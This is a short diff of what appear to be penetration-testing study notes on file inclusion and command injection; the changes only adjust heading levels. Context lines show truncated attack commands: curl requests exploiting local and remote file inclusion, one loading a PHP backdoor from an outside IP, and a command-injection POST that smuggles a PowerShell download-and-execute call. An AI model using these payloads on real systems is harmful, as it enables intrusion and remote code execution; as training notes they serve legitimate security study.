@@ -114,7 +114,7 @@ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64
 
 ![File Inclusion Example](FileInclusionExample.png)
 
-## Remote File Inclusion
+### Remote File Inclusion
 
 ```
 //Simple PHP backdoor
@@ -132,7 +132,7 @@ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/sim
 
 ```
 
-## Command Injection
+### Command Injection
 
 ```
 
@@ -156,3 +156,5 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 
 
 ```
+
+
